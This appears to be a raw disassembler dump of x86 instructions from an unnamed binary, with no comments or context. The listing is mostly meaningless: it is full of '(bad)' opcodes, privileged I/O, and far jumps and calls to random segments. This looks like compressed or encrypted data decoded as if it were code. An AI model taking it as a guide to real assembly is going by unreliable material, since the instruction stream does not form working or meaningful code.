  409ab5:	mov    al,ds:0x5c48246c
  409aba:	popf   
  409abb:	sbb    BYTE PTR [ebx],ch
  409abd:	hlt    
  409abe:	mov    cl,0x8b
  409ac0:	inc    esi
  409ac1:	retf   0xfe4
  409ac4:	(bad)  
  409ac5:	push   0xffffffa7
  409ac7:	(bad)  
  409ac9:	aaa    
  409aca:	inc    edx
  409acb:	call   0xdabc:0xfb7c1529
  409ad2:	shr    dl,0xc0
  409ad5:	pop    es
  409ad6:	shr    DWORD PTR [eax-0x26],cl
  409ad9:	jb     0x409a8b
  409adb:	loopne 0x409afa
  409add:	xchg   ecx,eax
  409ade:	xor    al,0xec
  409ae0:	outs   dx,DWORD PTR ds:[esi]
  409ae1:	sar    BYTE PTR [edx+esi*1+0x13],cl
  409ae5:	pop    es
  409ae6:	stc    
  409ae7:	arpl   WORD PTR [ebx],bp
  409ae9:	xor    eax,0x2d9f1a36
  409aee:	cs in  al,dx
  409af0:	xor    ecx,ecx
  409af2:	aad    0x23
  409af4:	jp     0x409b02
  409af6:	sub    eax,0xc59ef008
  409afb:	xor    eax,0x28d6da82
  409b00:	cmp    BYTE PTR [ecx],cl
  409b02:	lahf   
  409b03:	sbb    DWORD PTR [esi+0x2c],ecx
  409b06:	fisub  WORD PTR [ecx+ebp*4+0x78782dcc]
  409b0d:	cs mov dl,0x63
  409b10:	jmp    0xf07b:0x9900ba8a
  409b17:	not    BYTE PTR [ebp-0x59]
  409b1a:	dec    esp
  409b1b:	push   es
  409b1c:	cwde   
  409b1d:	xchg   esi,eax
  409b1e:	dec    edi
  409b1f:	mov    ch,0xc7
  409b21:	iret   
  409b22:	xchg   DWORD PTR [esi],esi
  409b24:	cmp    BYTE PTR [ebp+0x1e],0x8d
  409b28:	mov    esp,DWORD PTR [eax+0x3c]
  409b2b:	pushf  
  409b2c:	or     ch,BYTE PTR [edi]
  409b2e:	mov    DWORD PTR [esi],ecx
  409b30:	sbb    eax,0xb3d1a660
  409b35:	jp     0x409af5
  409b37:	xchg   esp,eax
  409b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b39:	sbb    ebp,DWORD PTR [edi+0x6180e9b4]
  409b3f:	mov    eax,0x7c39cc0c
  409b44:	dec    edi
  409b45:	xchg   esp,eax
  409b46:	loop   0x409bb3
  409b48:	fisttp QWORD PTR [ebp-0x5fa7444f]
  409b4e:	xor    esp,DWORD PTR [ebp+0xc]
  409b51:	(bad)  
  409b52:	pop    esi
  409b53:	lds    ebp,FWORD PTR [esp+ebx*1+0x4ee32c2b]
  409b5a:	pop    esp
  409b5b:	adc    edi,edi
  409b5d:	and    BYTE PTR [ecx+0xda032b9],ch
  409b63:	inc    ecx
  409b64:	cwde   
  409b65:	jo     0x409b7b
  409b67:	cli    
  409b68:	enter  0x2eb4,0x9d
  409b6c:	jmp    0xb330:0xc6c7ca28
  409b73:	and    DWORD PTR [ebx+esi*1+0xb7f36d6],edx
  409b7a:	mov    DWORD PTR [ebx],esp
  409b7c:	out    dx,eax
  409b7d:	mov    dl,0x32
  409b7f:	xchg   esi,eax
  409b80:	sub    eax,0xcd96efcf
  409b85:	sar    DWORD PTR [edx+0x76],0xb0
  409b89:	(bad)  
  409b8a:	fistp  DWORD PTR [ebp-0x38cc74e8]
  409b90:	int    0x45
  409b92:	jo     0x409bf1
  409b94:	push   edi
  409b95:	ficomp WORD PTR ds:0xcfd42876
  409b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b9c:	adc    al,0xd
  409b9e:	mov    ebp,0xf99d11f1
  409ba3:	sbb    BYTE PTR [ebx+ecx*8],0xda
  409ba7:	cmp    DWORD PTR [ecx-0x39],ebp
  409baa:	int3   
  409bab:	inc    ebp
  409bac:	xor    ah,BYTE PTR [edx]
  409bae:	dec    ebp
  409baf:	pusha  
  409bb0:	xor    al,0x5b
  409bb2:	jmp    FWORD PTR [esi-0x7a]
  409bb5:	jl     0x409b77
  409bb7:	jl     0x409b94
  409bb9:	(bad)  
  409bba:	(bad)  
  409bbb:	pop    ebp
  409bbc:	retf   0x2cf2
  409bbf:	and    ch,al
  409bc1:	in     eax,0x34
  409bc3:	dec    edi
  409bc4:	std    
  409bc5:	sub    bl,BYTE PTR [ebx-0x7]
  409bc8:	inc    esi
  409bc9:	add    DWORD PTR [edi+0x69],edx
  409bcc:	nop
  409bcd:	iret   
  409bce:	inc    edi
  409bcf:	hlt    
  409bd0:	rol    BYTE PTR [edi],cl
  409bd2:	or     eax,0xaa690e0f
  409bd7:	aaa    
  409bd8:	test   ebp,0x709f4497
  409bde:	cld    
  409bdf:	ja     0x409b79
  409be1:	pop    ds
  409be2:	ss adc dh,0xaa
  409be6:	retf   0x1aa3
  409be9:	sbb    DWORD PTR [ecx+edx*4-0x5],esi
  409bed:	xchg   ebp,eax
  409bee:	aas    
  409bef:	and    al,0xb1
  409bf1:	call   0xef88:0xe8240636
  409bf8:	cmp    bl,dh
  409bfa:	(bad)  
  409bfb:	pop    edi
  409bfc:	xor    eax,0x5517e8a1
  409c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c02:	push   ds
  409c03:	or     DWORD PTR [ebp+0xaf64d5d],ebx
  409c09:	fwait
  409c0a:	add    DWORD PTR ss:[esi-0x3],edx
  409c0e:	add    eax,0x5630b98e
  409c13:	push   ss
  409c14:	retf   0x96c2
  409c17:	pushf  
  409c18:	test   cl,0x8d
  409c1b:	xor    DWORD PTR [esi-0x34d8881c],esi
  409c21:	mov    DWORD PTR [edi+0x828a2f],esi
  409c27:	icebp  
  409c28:	jg     0x409c13
  409c2a:	or     DWORD PTR [edi],0xffffffaa
  409c2d:	icebp  
  409c2e:	mov    ebx,0x68c8a59d
  409c33:	sub    eax,0xa230db3f
  409c38:	hlt    
  409c39:	dec    esi
  409c3a:	inc    edi
  409c3b:	inc    ebx
  409c3c:	push   eax
  409c3d:	jo     0x409c4d
  409c3f:	inc    edx
  409c40:	int3   
  409c41:	jbe    0x409c2d
  409c43:	mov    esi,0x5089c8ad
  409c48:	retf   0x7380
  409c4b:	lahf   
  409c4c:	and    ecx,esi
  409c4e:	sub    edi,DWORD PTR [ecx+eiz*1-0x57fb684c]
  409c55:	push   edx
  409c56:	loop   0x409ca3
  409c58:	aad    0x21
  409c5a:	repnz not BYTE PTR [eax+0x7b]
  409c5e:	mov    cl,0x44
  409c60:	jae    0x409c8b
  409c62:	dec    esp
  409c63:	pop    eax
  409c64:	pop    ebp
  409c65:	push   ebp
  409c66:	cli    
  409c67:	sub    al,0x7d
  409c69:	push   cs
  409c6a:	mov    ch,0xa
  409c6c:	not    DWORD PTR [ebx]
  409c6e:	loope  0x409cdf
  409c70:	add    BYTE PTR [edx-0x3c29605c],0x12
  409c77:	dec    esp
  409c78:	push   eax
  409c79:	cmp    ah,BYTE PTR [ecx+0x7382ee7c]
  409c7f:	push   esp
  409c80:	jo     0x409c94
  409c82:	aas    
  409c83:	nop
  409c84:	loope  0x409c1d
  409c86:	adc    al,ch
  409c88:	inc    DWORD PTR [edi+0x40]
  409c8b:	ins    BYTE PTR es:[edi],dx
  409c8c:	dec    eax
  409c8d:	inc    edi
  409c8e:	lea    ebp,[esp+edx*1+0x622de48]
  409c95:	add    eax,edi
  409c97:	inc    esp
  409c98:	sub    dh,BYTE PTR [eax-0x5523936b]
  409c9e:	xchg   esi,eax
  409c9f:	in     eax,dx
  409ca0:	cmp    al,0xf1
  409ca2:	or     DWORD PTR [edx-0x5401269f],ecx
  409ca8:	sbb    DWORD PTR [eax+edi*2],eax
  409cab:	out    0xf4,al
  409cad:	lods   al,BYTE PTR ds:[esi]
  409cae:	dec    edi
  409caf:	add    DWORD PTR [esi],0xfffffff0
  409cb2:	pop    eax
  409cb3:	popa   
  409cb4:	pusha  
  409cb5:	sub    edi,edx
  409cb7:	cmp    edx,eax
  409cb9:	rcl    ah,1
  409cbb:	out    dx,al
  409cbc:	push   0xfc0e8345
  409cc1:	sbb    DWORD PTR [ebx],ebx
  409cc3:	pop    esp
  409cc4:	mov    al,0xcd
  409cc6:	test   DWORD PTR [ebp+0x76],esp
  409cc9:	pop    ebx
  409cca:	ret    0x6b32
  409ccd:	mov    ds:0xb3301183,al
  409cd2:	test   BYTE PTR [edi+ebx*8+0x43446e14],ch
  409cd9:	out    0x85,al
  409cdb:	add    edx,ecx
  409cdd:	inc    eax
  409cde:	ja     0x409c93
  409ce0:	pop    ss
  409ce1:	pusha  
  409ce2:	xor    DWORD PTR [eax],edi
  409ce4:	(bad)  
  409ce5:	or     eax,0x3fab7f1f
  409cea:	jl     0x409d64
  409cec:	dec    edx
  409ced:	sub    DWORD PTR ds:0x4210032e,ecx
  409cf3:	push   ebx
  409cf4:	cli    
  409cf5:	xchg   bl,bl
  409cf7:	xor    eax,ecx
  409cf9:	jp     0x409c99
  409cfb:	and    dl,BYTE PTR [eax]
  409cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cfe:	ror    BYTE PTR ds:0x843fe8ae,cl
  409d04:	add    eax,0xe8d8b9d2
  409d09:	mov    edx,0x494b50f
  409d0e:	push   eax
  409d0f:	data16 mov ch,0xf1
  409d12:	xor    BYTE PTR [ecx+esi*8-0x53],dh
  409d16:	jb     0x409cc8
  409d18:	dec    edi
  409d19:	adc    edx,ebx
  409d1b:	and    ah,BYTE PTR [edi+0x50]
  409d1e:	mov    esi,0x46cd75e
  409d23:	or     dl,BYTE PTR [ebx]
  409d25:	xchg   DWORD PTR [ebx+0x14],ebx
  409d28:	das    
  409d29:	mov    ebp,0xfffc874c
  409d2e:	jno    0x409cef
  409d30:	jmp    0xd88a:0xc4856153
  409d37:	sbb    al,0xee
  409d39:	xor    esi,ecx
  409d3b:	xchg   ebx,eax
  409d3c:	sub    esi,ecx
  409d3e:	arpl   WORD PTR [esi],ax
  409d40:	retf   0xfed8
  409d43:	and    esp,DWORD PTR [ecx+0x1]
  409d46:	dec    edx
  409d47:	arpl   sp,cx
  409d49:	mov    ds,WORD PTR [edi+0x4d]
  409d4c:	dec    ebx
  409d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d4e:	cmp    eax,0xba1f59c1
  409d53:	rol    BYTE PTR [edi],1
  409d55:	popf   
  409d56:	adc    BYTE PTR [ebx-0x545bd931],ch
  409d5c:	pop    edx
  409d5d:	(bad)  
  409d5e:	mov    ebp,0x25662aeb
  409d63:	sbb    eax,0xb3c22c19
  409d68:	and    al,0xcf
  409d6a:	dec    edi
  409d6b:	jg     0x409cf5
  409d6d:	call   0x2743:0x5c72d4b
  409d74:	outs   dx,DWORD PTR ds:[esi]
  409d75:	jge    0x409cfe
  409d77:	(bad)  
  409d78:	jb     0x409d9d
  409d7a:	sar    DWORD PTR [ebp-0x20],0x58
  409d7e:	cmp    al,0x71
  409d80:	sahf   
  409d81:	pusha  
  409d82:	and    al,0x27
  409d84:	loope  0x409dd5
  409d86:	fsubp  st(7),st
  409d88:	xchg   esp,eax
  409d89:	lods   al,BYTE PTR ds:[esi]
  409d8a:	xlat   BYTE PTR ds:[ebx]
  409d8b:	and    DWORD PTR [edx+0x4d79a78a],esp
  409d91:	pushf  
  409d92:	mov    eax,ds:0xff53c7c2
  409d97:	sar    DWORD PTR [eax-0x30],cl
  409d9a:	sub    ebp,ecx
  409d9c:	dec    eax
  409d9d:	test   al,0xf
  409d9f:	pop    esp
  409da0:	imul   ebx,DWORD PTR [esi],0x6d63b3f2
  409da6:	and    ah,BYTE PTR [ecx-0x42]
  409da9:	fisttp WORD PTR [esi+0x1d]
  409dac:	xchg   esi,eax
  409dad:	pushf  
  409dae:	ins    BYTE PTR es:[edi],dx
  409daf:	ret    
  409db0:	mov    bh,0x26
  409db2:	jp     0x409d55
  409db4:	retf   
  409db5:	sbb    eax,0x1dec2d48
  409dba:	cmp    ch,BYTE PTR [edi+0x3cb6df6e]
  409dc0:	pop    ecx
  409dc1:	adc    al,0xbc
  409dc3:	call   0x4205e5a6
  409dc8:	out    dx,eax
  409dc9:	mov    ecx,0xbf0c2cdd
  409dce:	mov    ds:0xaa77ae03,eax
  409dd3:	mov    ecx,0x49db3165
  409dd8:	loopne 0x409d77
  409dda:	(bad)  
  409ddb:	aas    
  409ddc:	pushf  
  409ddd:	and    ah,BYTE PTR [esi]
  409ddf:	jmp    0x409e13
  409de1:	pop    ebp
  409de2:	adc    eax,0xb1a68965
  409de7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409de8:	xchg   edi,eax
  409de9:	add    DWORD PTR [edx-0x5a1924b4],edi
  409def:	sbb    ch,BYTE PTR [ecx-0x1a]
  409df2:	test   BYTE PTR [edi],bh
  409df4:	cmp    eax,0x7cb519cc
  409df9:	lock retf 
  409dfb:	fs mov cl,0xff
  409dfe:	push   edx
  409dff:	and    eax,0x6f828c9a
  409e04:	and    bh,dh
  409e06:	sbb    eax,0x4becdb8b
  409e0b:	dec    edi
  409e0c:	jecxz  0x409e0d
  409e0e:	rcr    DWORD PTR [esi+0x4c00062d],1
  409e14:	pop    es
  409e15:	dec    edx
  409e16:	and    al,0xb8
  409e18:	jb     0x409ddd
  409e1a:	fs add ebp,eax
  409e1d:	lea    esi,ds:0x1d6d4141
  409e23:	xor    DWORD PTR [esi],ebp
  409e25:	push   cs
  409e26:	xchg   edi,eax
  409e27:	add    edi,DWORD PTR fs:[ebp-0xf7075b1]
  409e2e:	or     eax,0x28ceb057
  409e33:	clc    
  409e34:	xchg   ecx,esi
  409e36:	pop    edi
  409e37:	ss fst st(3)
  409e3a:	jmp    0x409dd0
  409e3c:	out    0xb4,al
  409e3e:	nop
  409e3f:	xchg   DWORD PTR ds:0x46d50fd8,ebx
  409e45:	daa    
  409e46:	inc    esp
  409e47:	mov    ebp,0x6dc99278
  409e4c:	jnp    0x409e77
  409e4e:	dec    esi
  409e4f:	js     0x409eac
  409e51:	(bad)  
  409e52:	jmp    0x409e19
  409e54:	mov    bl,0x86
  409e56:	loope  0x409e11
  409e58:	dec    esi
  409e59:	(bad)
  409e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e5d:	add    eax,DWORD PTR [esi+0x27]
  409e60:	adc    al,0xb8
  409e62:	jnp    0x409ea4
  409e64:	imul   edx,DWORD PTR [edi+0x1d],0x1df4b853
  409e6b:	or     cl,0x33
  409e6e:	sar    BYTE PTR [esi-0x36],1
  409e71:	lods   al,BYTE PTR ds:[esi]
  409e72:	popa   
  409e73:	out    0xfe,al
  409e75:	push   esi
  409e76:	mov    edi,0xcf808da2
  409e7b:	add    al,0xe2
  409e7d:	cvttps2pi mm7,QWORD PTR [esp+ebx*1+0x42]
  409e82:	inc    esi
  409e83:	push   eax
  409e84:	jge    0x409e60
  409e86:	fcmovne st,st(2)
  409e88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e89:	pop    edi
  409e8a:	inc    ebp
  409e8b:	nop
  409e8c:	pop    ds
  409e8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e8e:	pop    ebx
  409e8f:	arpl   dx,cx
  409e91:	fcom   QWORD PTR [ebx-0x6586ddb8]
  409e97:	js     0x409ed8
  409e99:	mov    eax,ds:0x9d675495
  409e9e:	xchg   edi,eax
  409e9f:	xchg   esp,eax
  409ea0:	mov    al,0xf3
  409ea2:	push   ebp
  409ea3:	add    BYTE PTR [edi+0x2],al
  409ea6:	xchg   esi,eax
  409ea7:	loop   0x409f12
  409ea9:	and    BYTE PTR [edx+ecx*8+0x63],0x27
  409eae:	xchg   BYTE PTR [ebx+0x6e],cl
  409eb1:	rol    esp,0x28
  409eb4:	cwde   
  409eb5:	icebp  
  409eb6:	sbb    eax,edx
  409eb8:	inc    edx
  409eb9:	or     BYTE PTR [ebx],0x6c
  409ebc:	cmp    BYTE PTR [eax+0x30d2a0cb],ch
  409ec2:	out    dx,eax
  409ec3:	inc    ebp
  409ec4:	stc    
  409ec5:	jl     0x409e66
  409ec7:	and    DWORD PTR [ebx+0x2a],edi
  409eca:	out    0xa7,al
  409ecc:	push   eax
  409ecd:	push   cs
  409ece:	sbb    eax,0x3335f508
  409ed3:	dec    edi
  409ed4:	(bad)  
  409ed5:	sbb    BYTE PTR [edi+0x2e],ch
  409ed8:	mov    eax,ds:0x1cc1037c
  409edd:	dec    esi
  409ede:	jnp    0x409e8c
  409ee0:	jns    0x409e87
  409ee2:	dec    edx
  409ee3:	pop    edx
  409ee4:	nop
  409ee5:	push   es
  409ee6:	loope  0x409f36
  409ee8:	dec    ebp
  409ee9:	rcl    BYTE PTR [ebx-0x61],cl
  409eec:	pop    ebx
  409eed:	jge    0x409f06
  409eef:	mov    al,ds:0x58fe07cb
  409ef4:	repz (bad) 
  409ef6:	(bad)  
  409ef8:	popa   
  409ef9:	jno    0x409ed2
  409efb:	dec    ebx
  409efc:	pop    esp
  409efd:	adc    al,BYTE PTR [ebp-0x724741ae]
  409f03:	sub    ah,BYTE PTR [eax]
  409f05:	dec    esi
  409f06:	outs   dx,BYTE PTR ds:[esi]
  409f07:	push   ebx
  409f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f09:	in     eax,dx
  409f0a:	stos   DWORD PTR es:[edi],eax
  409f0b:	pop    ss
  409f0c:	or     dl,BYTE PTR [edi+0x3b]
  409f0f:	dec    edi
  409f10:	(bad)  
  409f11:	and    BYTE PTR [ebx+0x2bcb137],0xea
  409f18:	fnstenv [eax+esi*4+0x67]
  409f1c:	lea    eax,[ebx+ecx*1]
  409f1f:	dec    ebx
  409f20:	push   0xb2079ed4
  409f25:	shl    BYTE PTR [eax-0x5a],1
  409f28:	mov    edi,DWORD PTR [ebx+edi*8]
  409f2b:	sub    DWORD PTR ds:0xf540691b,0xffffff9a
  409f32:	inc    eax
  409f33:	les    ebx,FWORD PTR [esi+0x573c03af]
  409f39:	das    
  409f3a:	repnz pop ebp
  409f3c:	daa    
  409f3d:	(bad)  
  409f3e:	sub    al,0xee
  409f40:	push   ss
  409f41:	out    dx,al
  409f42:	jns    0x409fc0
  409f44:	(bad)  
  409f45:	mov    ch,0x71
  409f47:	stos   DWORD PTR es:[edi],eax
  409f48:	in     al,dx
  409f49:	add    ch,BYTE PTR [eax-0x1a]
  409f4c:	cmp    DWORD PTR [ecx],ebx
  409f4e:	ds or  eax,edi
  409f51:	pop    esi
  409f52:	mov    BYTE PTR [edx+0x7d539ea7],al
  409f58:	push   edx
  409f59:	jo     0x409f35
  409f5b:	imul   BYTE PTR [edx-0x4b]
  409f5e:	or     eax,0x346ef181
  409f63:	shl    BYTE PTR [edi],1
  409f65:	mov    edx,0xc27e7c88
  409f6a:	imul   ecx,DWORD PTR [edx-0xc],0x61
  409f6e:	out    dx,al
  409f6f:	rcr    DWORD PTR [edi-0x10],1
  409f72:	jle    0x409fd3
  409f74:	jne    0x409f25
  409f76:	outs   dx,BYTE PTR ds:[esi]
  409f77:	xchg   ecx,eax
  409f78:	lahf   
  409f79:	xor    bh,BYTE PTR [edx-0x32]
  409f7c:	mov    ebx,esp
  409f7e:	sahf   
  409f7f:	ds in  al,0x61
  409f82:	or     BYTE PTR [esi+0x28],0xa3
  409f86:	xor    eax,0xfd97740
  409f8b:	scas   al,BYTE PTR es:[edi]
  409f8c:	int    0x5b
  409f8e:	call   0x7787:0x7bf6d820
  409f95:	loop   0x409fe8
  409f97:	ficom  DWORD PTR [ebx-0x7d0ae7de]
  409f9d:	jmp    0x40a006
  409f9f:	mov    esi,0x2c87eefa
  409fa4:	clc    
  409fa5:	aas    
  409fa6:	int    0xd7
  409fa8:	pop    ecx
  409fa9:	pushf  
  409faa:	lahf   
  409fab:	cmpxchg dl,dl
  409fae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409faf:	ficom  DWORD PTR [edi+0x52]
  409fb2:	loopne 0x409fe0
  409fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fb5:	jecxz  0x40a01c
  409fb7:	adc    BYTE PTR [esi],dh
  409fb9:	shr    DWORD PTR [ecx],cl
  409fbb:	add    bh,BYTE PTR [eax]
  409fbd:	imul   ebp,eax,0x4501d3a5
  409fc3:	cwde   
  409fc4:	jb     0x40a03c
  409fc6:	out    dx,al
  409fc7:	out    0xb2,eax
  409fc9:	fst    DWORD PTR [edi]
  409fcb:	clc    
  409fcc:	mov    dh,0x3
  409fce:	inc    ecx
  409fcf:	(bad)  
  409fd0:	and    ch,BYTE PTR [edx]
  409fd2:	sahf   
  409fd3:	loope  0x40a009
  409fd5:	push   ss
  409fd6:	lods   eax,DWORD PTR ds:[esi]
  409fd7:	cwde   
  409fd8:	inc    ecx
  409fd9:	push   ss
  409fda:	(bad)  
  409fdb:	loopne 0x409fb0
  409fdd:	push   ds
  409fde:	arpl   WORD PTR [edx+0x46],dx
  409fe1:	imul   BYTE PTR [edi-0xa]
  409fe4:	jge    0x409f8f
  409fe6:	mov    esi,DWORD PTR [ecx+0x48]
  409fe9:	xchg   BYTE PTR [edi-0x78],bl
  409fec:	in     eax,0xa
  409fee:	stos   DWORD PTR es:[edi],eax
  409fef:	sbb    al,0xd
  409ff1:	inc    ebx
  409ff2:	addr16 jnp 0x409f7a
  409ff5:	cmp    DWORD PTR [ebx+0x75],0xffffffde
  409ff9:	(bad)  
  409ffa:	pop    esi
  409ffb:	cmc    
  409ffc:	or     dl,BYTE PTR [ebp+0x42]
  409fff:	fild   DWORD PTR [eax]
  40a001:	lods   eax,DWORD PTR ds:[esi]
  40a002:	sub    DWORD PTR [edx-0x6c],ebp
  40a005:	neg    DWORD PTR [ecx-0x1]
  40a008:	mov    edx,0x28ae1f05
  40a00d:	in     eax,dx
  40a00e:	stc    
  40a00f:	mov    dl,0x6a
  40a011:	sub    eax,0x693d748a
  40a016:	mov    esp,0xc5ecf590
  40a01b:	call   0x7d0c5c3b
  40a020:	mov    gs,ebp
  40a022:	cdq    
  40a023:	sub    bh,BYTE PTR [ebx+0x26f37a3b]
  40a029:	mov    ah,0xec
  40a02b:	cli    
  40a02c:	dec    edi
  40a02d:	xchg   DWORD PTR [ebx+eax*4+0x4],ecx
  40a031:	out    0xa,al
  40a033:	xor    edi,DWORD PTR [ecx]
  40a035:	push   cs
  40a036:	je     0x40a034
  40a038:	(bad)  
  40a039:	add    al,0x91
  40a03b:	and    al,0x9
  40a03d:	mov    ebx,0x91e274b1
  40a042:	mov    ebx,0x4f4df8f0
  40a047:	cmp    al,0x51
  40a049:	inc    esi
  40a04a:	inc    edi
  40a04b:	xchg   ebx,eax
  40a04c:	or     al,0x12
  40a04e:	pop    es
  40a04f:	and    ebx,esi
  40a051:	adc    al,0x1d
  40a053:	enter  0x97aa,0x3f
  40a057:	lahf   
  40a058:	pushf  
  40a059:	sbb    DWORD PTR [ecx-0x39],edx
  40a05c:	mov    ds:0xb4296bf4,al
  40a061:	dec    edi
  40a062:	test   eax,0x43880f57
  40a067:	or     ecx,DWORD PTR [edi-0xf]
  40a06a:	sbb    ebp,ebp
  40a06c:	and    dh,BYTE PTR [edi-0x69cb9247]
  40a072:	int    0x19
  40a074:	mov    ds,WORD PTR [ebx-0x59]
  40a077:	fsubr  DWORD PTR [edi-0x9]
  40a07a:	cmp    ebp,ecx
  40a07c:	inc    ecx
  40a07d:	enter  0x5414,0x0
  40a081:	add    al,0x72
  40a083:	hlt    
  40a084:	fstp   QWORD PTR [ebx-0x1a]
  40a087:	mov    ds:0xb2cb09d4,al
  40a08c:	retf   
  40a08d:	cmp    BYTE PTR [esi+0x72],0xe0
  40a091:	shr    ch,1
  40a093:	aaa    
  40a094:	loopne 0x40a027
  40a096:	pusha  
  40a097:	dec    esi
  40a098:	ins    DWORD PTR es:[edi],dx
  40a099:	retf   0x9fc8
  40a09c:	pop    ebp
  40a09d:	add    DWORD PTR [ecx+0x4887ad6a],0x32
  40a0a4:	mov    WORD PTR [esi-0x64],cs
  40a0a7:	pop    ds
  40a0a8:	mov    ds:0xc7e5b327,al
  40a0ad:	in     al,0xa3
  40a0af:	nop
  40a0b0:	xlat   BYTE PTR ds:[ebx]
  40a0b1:	sbb    DWORD PTR [edx-0x69b7dd84],esp
  40a0b7:	fild   WORD PTR [ebp-0x30]
  40a0ba:	inc    edi
  40a0bb:	xchg   BYTE PTR [ebx-0x54db0475],bh
  40a0c1:	sub    DWORD PTR [ebx],ecx
  40a0c3:	fisttp WORD PTR [ecx]
  40a0c5:	cmp    DWORD PTR [esi-0x3],0xb04d5e44
  40a0cc:	xchg   BYTE PTR [edx+eiz*4+0xe],dl
  40a0d0:	call   0x56bb:0x4a136458
  40a0d7:	jb     0x40a138
  40a0d9:	addr16 test al,0x44
  40a0dc:	ins    DWORD PTR es:[edi],dx
  40a0dd:	push   ds
  40a0de:	cmp    cl,BYTE PTR [ebx+0xa21fe08]
  40a0e4:	fild   WORD PTR [edx-0x2f]
  40a0e7:	cmc    
  40a0e8:	mov    bl,0x35
  40a0ea:	xchg   ebx,eax
  40a0eb:	cmp    esp,eax
  40a0ed:	pusha  
  40a0ee:	jecxz  0x40a0e3
  40a0f0:	push   0xab6efbdc
  40a0f5:	bound  edi,QWORD PTR [ecx+0x6aff5478]
  40a0fb:	outs   dx,BYTE PTR ds:[esi]
  40a0fc:	or     dl,BYTE PTR [edx+0x6c5ad96a]
  40a102:	cld    
  40a103:	fadd   DWORD PTR [edx]
  40a105:	xchg   edi,eax
  40a106:	test   DWORD PTR [ebp+0x2e22ff94],ebp
  40a10c:	xchg   ecx,eax
  40a10d:	jp     0x40a0e3
  40a10f:	inc    esp
  40a110:	into   
  40a111:	repnz div DWORD PTR [eax-0x54]
  40a115:	shr    dl,cl
  40a117:	gs ret 
  40a119:	cmp    BYTE PTR [esi-0x7d],cl
  40a11c:	dec    esp
  40a11d:	mov    bh,0x7c
  40a11f:	ss add eax,0x58a04202
  40a125:	sbb    DWORD PTR [ebx-0x35743ecc],eax
  40a12b:	pop    eax
  40a12c:	mov    ebp,0x4315d007
  40a131:	dec    edx
  40a132:	inc    edi
  40a133:	adc    eax,0x9bb990d2
  40a138:	ins    BYTE PTR es:[edi],dx
  40a139:	lods   eax,DWORD PTR ds:[esi]
  40a13a:	stc    
  40a13b:	mov    dh,0xe9
  40a13d:	push   edx
  40a13e:	aad    0xa0
  40a140:	dec    esp
  40a141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a142:	add    eax,0xad99a254
  40a147:	pop    edx
  40a148:	push   esp
  40a149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a14a:	and    eax,0x6c303a68
  40a14f:	dec    esp
  40a150:	aas    
  40a151:	retf   
  40a152:	mov    ebp,0x8e461464
  40a157:	shl    esi,0xe9
  40a15a:	dec    eax
  40a15b:	mov    ah,0x6c
  40a15d:	mov    edi,0x724e16ce
  40a162:	xor    al,0x8a
  40a164:	fdiv   DWORD PTR [edi+eiz*8+0x3a]
  40a168:	in     eax,0xdd
  40a16a:	ds inc edx
  40a16c:	stos   BYTE PTR es:[edi],al
  40a16d:	pop    eax
  40a16e:	push   ecx
  40a16f:	jb     0x40a1ba
  40a171:	sbb    BYTE PTR [edx],ah
  40a173:	stos   DWORD PTR es:[edi],eax
  40a174:	inc    edx
  40a175:	ds loopne 0x40a1f5
  40a178:	mov    cl,0x48
  40a17a:	dec    eax
  40a17b:	mov    ch,0x7
  40a17d:	loope  0x40a1d0
  40a17f:	adc    al,0x39
  40a181:	scas   eax,DWORD PTR es:[edi]
  40a182:	and    BYTE PTR [eax+0x19],bl
  40a185:	ins    DWORD PTR es:[edi],dx
  40a186:	mov    eax,0x295d2085
  40a18b:	idiv   BYTE PTR [ebp-0x1c]
  40a18e:	outs   dx,DWORD PTR ds:[esi]
  40a18f:	std    
  40a190:	repnz popa 
  40a192:	jnp    0x40a17e
  40a194:	jmp    0xa265:0xe046eb06
  40a19b:	fwait
  40a19c:	mov    ebx,0xd425e464
  40a1a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1a2:	jp     0x40a142
  40a1a4:	and    DWORD PTR [ebx+0x1b704892],eax
  40a1aa:	(bad)  
  40a1ab:	lods   al,BYTE PTR ds:[esi]
  40a1ac:	lock inc esi
  40a1ae:	pop    ebx
  40a1af:	dec    ebp
  40a1b0:	imul   edi,DWORD PTR [edi],0x37
  40a1b3:	mov    esi,0x684d3f95
  40a1b8:	daa    
  40a1b9:	xor    esi,esi
  40a1bb:	test   bh,bh
  40a1bd:	jl     0x40a234
  40a1bf:	inc    edi
  40a1c0:	xchg   ebp,eax
  40a1c1:	enter  0xf250,0x71
  40a1c5:	pop    ecx
  40a1c6:	dec    eax
  40a1c7:	ror    bh,0x8b
  40a1ca:	adc    eax,esp
  40a1cc:	shl    dh,cl
  40a1ce:	and    DWORD PTR [esi+0x6f7684af],esi
  40a1d4:	in     al,0x3e
  40a1d6:	or     DWORD PTR [ebx-0x7d],ecx
  40a1d9:	mov    bh,0xf4
  40a1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1dc:	ja     0x40a22c
  40a1de:	pop    edi
  40a1df:	push   ss
  40a1e0:	adc    eax,DWORD PTR [eax]
  40a1e2:	inc    eax
  40a1e3:	jmp    0x9893:0x63401dfd
  40a1ea:	aaa    
  40a1eb:	pop    esi
  40a1ec:	fisttp QWORD PTR [esi-0x3ba32020]
  40a1f2:	or     BYTE PTR [eax-0x5e],0x2
  40a1f6:	and    DWORD PTR [edi-0xb4d9a0f],edi
  40a1fc:	sbb    BYTE PTR ds:0xabe565b3,cl
  40a202:	pop    ebx
  40a203:	mov    esp,0x65f5b3ae
  40a208:	mov    bl,0xb1
  40a20a:	out    dx,al
  40a20b:	fwait
